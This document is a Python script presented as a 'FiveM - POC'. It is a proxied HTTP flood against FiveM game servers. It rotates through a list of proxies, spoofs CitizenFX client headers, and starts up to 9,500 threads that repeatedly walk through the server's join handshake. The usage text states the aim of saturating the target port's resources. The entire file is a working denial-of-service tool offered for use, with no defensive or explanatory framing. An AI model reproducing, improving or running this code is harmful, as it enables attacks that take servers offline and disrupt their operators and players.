import requests, threading, random, sys, uuid, time
proxies = open("http.txt", "r").read().split("\n") # Save system IO and other resources and stop ram spikes for opening large proxy lists every worker!
if len(sys.argv) != 5:
    print("FiveM - POC, Invalid usage...")
    print("IP PORT True/False <- Safe Mode time")
    print("Poc does a semi-full round proxied-handshake on http for the joining proccess, Exploiting the http requests for info. ")
    print("Meant to saturate the port resources without using raw tcp power. Next is a tcp&udp version mixed with the http to simulate a 100% real connection!")
    exit()
def prox():
    return random.choice(proxies)
def worker(ip,port,secs):
    try:
        browser = requests.session()
        proxy = prox()
        browser.proxies = {"http":proxy}
        token = str(uuid.uuid4())
        client_headers = {
            "Host":f"{ip}:{port}",
            "User-Agent": 'CitizenFX',
            "Accept": "*/*"
        }
        post_data = {
            "method": "getEndpoints",
            "token": token
        }
        post_headers = {
            "Host":f"{ip}:{port}",
            "User-Agent": "CitizenFX/1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "62"
        }
        while time.time() < secs:
            client = browser.get(f"http://{ip}:{port}/info.json", headers=client_headers)
            match client.status_code:
                case 200:
                    print(f"(1/4) [{proxy}] -> Init Client Request!")
                case _:
                    if sys.argv[3].lower() == "true":
                        print(f"_FAILED_ (1/4) [{proxy}] -> Breaking Down Proxy Connection!")
                        browser.close()
                        break
                    print(f"(1/4) [{proxy}] -> Init Client Request! | Skipping safe mode.")
            client = browser.post(f"http://{ip}:{port}/client", headers=post_headers, json=post_data)
            match client.status_code:
                case 200:
                    print(f"(2/4) [{proxy}] -> Posted Client Data!")
                case _:
                    if sys.argv[3].lower() == "true":
                        print(f"_FAILED_ (2/4) [{proxy}] -> Breaking Down Proxy Connection!")
                        browser.close()
                        break
                    print(f"(2/4) [{proxy}] -> Posted Client Data! | Skipping safe mode.")
            client_headers["User-Agent"] = "CitizenFX/1"
            client = browser.get(f"http://{ip}:{port}/info.json", headers=client_headers)
            match client.status_code:
                case 200:
                    print(f"(3/4) [{proxy}] -> Init Client Request 2!")
                case _:
                    if sys.argv[3].lower() == "true":
                        print(f"_FAILED_ (3/4) [{proxy}] -> Breaking Down Proxy Connection!")
                        browser.close()
                        break
                    print(f"(3/4) [{proxy}] -> Init Client Request 2! | Skipping safe mode.")
            post_data["X-CitizenFX-Token"] = token
            post_headers['User-Agent'] = "CitizenFX/1"
            post_headers["Content-Length"] = "23"
            post_data["method"] = "getConfiguration"
            client = browser.post(f"http://{ip}:{port}/client", headers=post_headers, json=post_data)
            match client.status_code:
                case 200:
                    print(f"(4/4) [{proxy}] -> Posted Client Data Config!")
                case _:
                    if sys.argv[3].lower() == "true":
                        print(f"_FAILED_ (4/4) [{proxy}] -> Breaking Down Proxy Connection!")
                        browser.close()
                        break
                    print(f"(4/4) [{proxy}] -> Posted Client Data Config! | Skipping safe mode.")
            client_headers["User-Agent"] = "curl/7.83.1-DEV"
            client = browser.get(f"http://{ip}:{port}/info.json", headers=client_headers)
            match client.status_code:
                case 200:
                    print(f"(Final) [{proxy}] -> Init Client Request Success!")
                case _:
                    if sys.argv[3].lower() == "true":
                        print(f"_FAILED_ (Final) [{proxy}] -> Breaking Down Proxy Connection!")
                        browser.close()
                        break
                    print(f"(Final:NSM) [{proxy}] -> Init Client Request Success! | Skipping safe mode.")
            browser.close()
            break
        return
    except:
        print("__Error__ Proxy failed!")
while True:
    while threading.active_count() >= 9500:
        pass
    threading.Thread(target=worker, args=(sys.argv[1], sys.argv[2],time.time() + int(sys.argv[4]))).start()